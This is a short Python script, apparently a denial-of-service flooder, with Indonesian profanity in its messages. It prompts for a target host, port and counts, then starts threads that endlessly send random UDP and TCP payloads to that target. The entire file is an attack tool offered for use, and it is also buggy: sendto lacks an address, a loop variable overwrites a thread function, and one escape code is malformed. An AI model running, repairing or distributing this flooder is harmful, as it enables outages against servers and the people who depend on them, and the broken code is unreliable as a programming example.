import random
import socket
import threading
import os,sys
import time

print("\033[91")
print("peringatan ddos adalah kontol memek tunggu 7 detik")
time.sleep(7)
os.system("clear")
print("\033[91m")
print("""kontol mekek""")

p1 = str(input("p1 :"))
p2 = int(input("p2 :"))
p3 = int(input("p3 :"))
p4 = int(input("p4 :"))
os.system("clear")
def ye():
    yo = random._urandom(1045)
    i = random.choice("Attack"","",""")
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(yo)
            for x in range(p3):
                s.sendto(yo)
            print(i +"gabut to pengen ddos")
        except:
            print("yeh down asuh")

def tod():
    mek = random._urandom(1035)
    i = random.choice("Attack"","",""")
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            s.connect((p1,p2))
            s.sendto(mek)
            for x in range(p3):
                s.sendto(mek)
            print(i +"gabut to pengen ddos")
        except:
            print("yeh down asuh")

def y():
    mek = random._urandom(800)
    i = random.choice("Attack"","",""")
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            s.connect((p1,p2))
            s.sendto(mek)
            for x in range(p3):
                s.sendto(mek)
            print(i +"gabut to pengen ddos")
        except:
            print("yeh down asuh")

def p():
    mek = random._urandom(14)
    i = random.choice("Attack"","",""")
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            s.connect((p1,p2))
            s.sendto(mek)
            for x in range(p3):
                s.sendto(mek)
            print(i +"gabut to pengen ddos")
        except:
            s.close()
            print("yeh down asuh")



for y in range(p4):
    th = threading.Thread(target = ye)
    th.start()
    th = threading.Thread(target = tod)
    th.start()
    th = threading.Thread(target = y)
    th.start()
else:
    th = threading.Thread(target = p)
    th.start()
